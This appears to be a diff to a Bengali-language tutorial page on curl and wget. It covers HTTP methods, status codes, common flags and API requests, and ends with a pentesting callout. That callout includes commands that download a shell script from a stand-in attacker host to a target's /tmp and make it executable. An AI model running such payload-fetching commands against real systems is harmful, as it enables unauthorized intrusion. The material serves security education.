@@ -8,161 +8,201 @@ import { Callout, Tabs } from 'nextra/components'
 # curl & wget
 
 <Callout type="info">
-  Browser ছাড়া terminal থেকে websites-এ request পাঠানো, API call করা, files download করা — এই দুটো tool দিয়ে সব হয়। Penetration testing আর CTF-এ এগুলো অনেক বেশি লাগে।
+  Browser ছাড়া terminal থেকে web server-এ request পাঠানো, API call করা, file download করা — `curl` আর `wget` দিয়ে সব হয়। Penetration testing-এ এই দুটো tool প্রতিদিন লাগে।
 </Callout>
+
+## HTTP Request কী
+
+**আগে বোঝো, তারপর command।**
+
+তুমি browser-এ `google.com` লিখলে browser আসলে Google-এর server-এ একটা **HTTP Request** পাঠায়। Server সেটা দেখে **HTTP Response** পাঠায় — যেখানে web page-এর content থাকে।
+
+`curl` হলো সেই browser-এর কাজটাই terminal থেকে করার tool।
+
+**HTTP Methods:**
+
+| Method | মানে | কাজ |
+|--------|------|-----|
+| `GET` | তথ্য নাও | Page load করা, data read করা |
+| `POST` | তথ্য পাঠাও | Form submit, login, file upload |
+| `PUT` | তথ্য update করো | Existing record বদলানো |
+| `DELETE` | তথ্য মুছে দাও | Record delete করা |
+
+**HTTP Response code:**
+
+| Code | মানে |
+|------|------|
+| `200` | OK — সফল |
+| `301/302` | Redirect — অন্য URL-এ যাও |
+| `403` | Forbidden — আছে কিন্তু access নেই |
+| `404` | Not Found — নেই |
+| `500` | Server Error — server-এ সমস্যা |
 
 ## curl vs wget
 
 | | curl | wget |
 |-|------|------|
-| Main use | HTTP requests, APIs | File download |
-| Protocol support | HTTP, HTTPS, FTP, SCP... | HTTP, HTTPS, FTP |
-| Output | Terminal-এ print করে | File-এ save করে |
+| মূল কাজ | HTTP requests, API testing | File download |
+| Output | Terminal-এ দেখায় | File-এ save করে |
+| API support | হ্যাঁ — best choice | না |
 | Recursive download | না | হ্যাঁ |
-| API testing | Best | না |
-
----
+| Resume download | না (সহজে) | হ্যাঁ (`-c`) |
 
 ## `curl`
 
-HTTP request পাঠাও আর response দেখো।
+**Basic requests:**
 
 ```bash filename="Terminal"
-# GET request — page content দেখো
+# GET request — page content terminal-এ দেখো
 curl https://example.com
 
-# Response headers দেখো
+# শুধু Response headers দেখো (body নয়)
+# Server software, content type, redirect দেখতে কাজে লাগে
 curl -I https://example.com
 
 # Headers + body দুটোই
 curl -i https://example.com
 
-# Output file-এ save করো
-curl -o output.html https://example.com
-curl -O https://example.com/file.zip
+# File-এ save করো
+curl -o output.html https://example.com    # নিজের নাম দাও
+curl -O https://example.com/file.zip       # original নাম রাখো
 
-# Follow redirects
+# Redirect follow করো (301/302)
 curl -L https://short.url/abc
 
-# Verbose mode — পুরো request/response দেখো
+# Verbose — পুরো request এবং response দেখো
 curl -v https://example.com
 
-# Silent mode — progress bar দেখাবে না
+# Silent — progress bar লুকাও (script-এ ব্যবহার করতে)
 curl -s https://example.com
 ```
 
-### API Requests
+**API requests:**
 
 ```bash filename="Terminal"
 # GET request
 curl https://api.example.com/users
 
-# POST request with JSON
+# POST — JSON data পাঠাও (login, form submit)
 curl -X POST https://api.example.com/login \
   -H "Content-Type: application/json" \
   -d '{"username":"admin","password":"pass123"}'
+# -X POST = method
+# -H = header যোগ করো
+# -d = body data
 
-# Custom headers
-curl -H "Authorization: Bearer TOKEN" https://api.example.com/data
+# Authentication header
+curl -H "Authorization: Bearer eyJhbGci..." https://api.example.com/data
 
-# PUT request
+# PUT — existing data update
 curl -X PUT https://api.example.com/user/1 \
   -H "Content-Type: application/json" \
   -d '{"name":"Omar"}'
 
-# DELETE request
+# DELETE
 curl -X DELETE https://api.example.com/user/1
 ```
 
-### Useful Flags
+<Callout type="default">
+  **Bearer Token কী:** API authentication-এ server একটা token দেয়। সেটা প্রতিটো request-এ header-এ পাঠাতে হয় — এটাই Bearer token। `Authorization: Bearer TOKEN` এই format-এ।
+</Callout>
+
+**Useful flags চিটশিট:**
 
 | Flag | কাজ |
 |------|-----|
-| `-X` | HTTP method specify (GET, POST, PUT, DELETE) |
-| `-H` | Custom header add করো |
-| `-d` | Request body data |
-| `-o` | Output filename specify করো |
+| `-X METHOD` | HTTP method specify করো |
+| `-H "Header: Value"` | Custom header যোগ করো |
+| `-d "data"` | Request body data |
+| `-o filename` | Output file নাম দাও |
 | `-O` | Original filename-এ save করো |
-| `-L` | Redirects follow করো |
+| `-L` | Redirect follow করো |
 | `-I` | শুধু headers দেখো |
+| `-i` | Headers + body দেখো |
 | `-s` | Silent mode |
-| `-v` | Verbose output |
-| `-k` | SSL certificate ignore করো |
-
----
+| `-v` | Verbose — সব দেখো |
+| `-k` | SSL certificate error ignore করো |
 
 ## `wget`
 
-File download-এর জন্য সবচেয়ে reliable tool।
+File download-এর জন্য সবচেয়ে reliable।
 
 ```bash filename="Terminal"
 # File download করো
 wget https://example.com/file.zip
 
-# নাম দিয়ে save করো
+# নিজের নাম দিয়ে save করো
 wget -O myfile.zip https://example.com/file.zip
 
-# Background-এ download
+# Background-এ download (বড় file)
 wget -b https://example.com/largefile.iso
 
-# Resume interrupted download
+# Interrupted download resume করো
 wget -c https://example.com/largefile.iso
 
-# Download speed limit
+# Speed limit — bandwidth বাঁচাতে
 wget --limit-rate=500k https://example.com/file.zip
 
-# Multiple files download
+# একাধিক file — urls.txt-এ প্রতি line-এ একটা URL
 wget -i urls.txt
-# urls.txt এ প্রতি line-এ একটা URL
 ```
-
----
 
 ## CyberSec Note
 
 <Callout type="warning">
   **curl আর wget pentesting-এ:**
 
-  ```bash
-  # Server technology detect করো
+  **Information gathering:**
+
+  ```bash filename="Terminal"
+  # Server technology detect করো — কোন web server, কোন version
   curl -I https://target.com
   # Server: nginx/1.18.0
+  # X-Powered-By: PHP/7.4.3
 
-  # Robots.txt পড়ো — hidden paths পাওয়া যায়
+  # robots.txt পড়ো — admin বলে দিচ্ছে কোন paths hide করতে চাইছে
+  # এই paths গুলোই interesting target
   curl https://target.com/robots.txt
+  # Disallow: /admin
+  # Disallow: /backup
+  # Disallow: /secret
 
-  # Directory bruteforce-এ API endpoint test করো
+  # HTTP status code দেখে path exists কিনা বোঝো
   curl -s -o /dev/null -w "%{http_code}" https://target.com/admin
-  # 200 = exists, 404 = not found, 403 = forbidden
+  # 200 = exists, 403 = exists but forbidden, 404 = নেই
+  ```
 
-  # Reverse shell download করো target machine-এ
-  wget http://attacker-ip/shell.sh -O /tmp/shell.sh
+  **File transfer — target machine-এ payload পাঠাও:**
+
+  ```bash filename="Terminal"
+  # Target machine-এ shell download করো
+  wget http://attacker-ip:8000/shell.sh -O /tmp/shell.sh
   chmod +x /tmp/shell.sh
-  /tmp/shell.sh
 
-  # File upload via curl
-  curl -F "file=@exploit.php" https://target.com/upload
+  # অথবা curl দিয়ে
+  curl http://attacker-ip:8000/shell.sh -o /tmp/shell.sh
+  ```
 
-  # SSL certificate ignore (self-signed)
+  **SSL ignore — internal apps:**
+
+  ```bash filename="Terminal"
+  # Self-signed certificate থাকলে
   curl -k https://internal-app.local
   ```
 
-  TryHackMe-তে প্রায়ই `wget` দিয়ে exploit download করতে হয় target machine-এ, আর `curl` দিয়ে API endpoints test করতে হয়।
+  TryHackMe-তে প্রায়ই `wget` দিয়ে exploit download করতে হয় target machine-এ, আর `curl` দিয়ে API endpoints test আর status code দেখতে হয়।
 </Callout>
-
----
 
 ## Quick Check
 
-- [ ] `curl` আর `wget` এর মূল ব্যবহারের পার্থক্য কী?
-- [ ] `curl -I` কী দেখায়?
-- [ ] POST request পাঠাতে curl-এ কোন flags লাগে?
-- [ ] Interrupted download resume করতে wget-এ কোন flag?
+- [ ] `GET` আর `POST` request-এর পার্থক্য কী?
+- [ ] `curl -I` আর `curl -i` — কোনটায় কী পার্থক্য?
+- [ ] Response code `403` আর `404` কীভাবে আলাদা?
+- [ ] `robots.txt` কেন pentesting-এ দেখা হয়?
+- [ ] `wget -c` কেন ব্যবহার করবে?
 
-এই section শেষ।
-
-**পরবর্তী Section →** [Package Management](/docs/linux-fundamentals/08-package-management)
+**পরবর্তী →** [Netcat](/docs/linux-fundamentals/07-networking/netcat)
 
 <span style={{ display: 'none' }}>
-  Search Keywords: linux curl wget, curl POST request, wget download, curl API testing, curl headers, wget resume download, curl cybersecurity
+  Search Keywords: linux curl wget bangla, curl POST request Bengali, HTTP methods GET POST, wget download, curl API testing, curl headers robots.txt, cybersecurity curl
 </span>
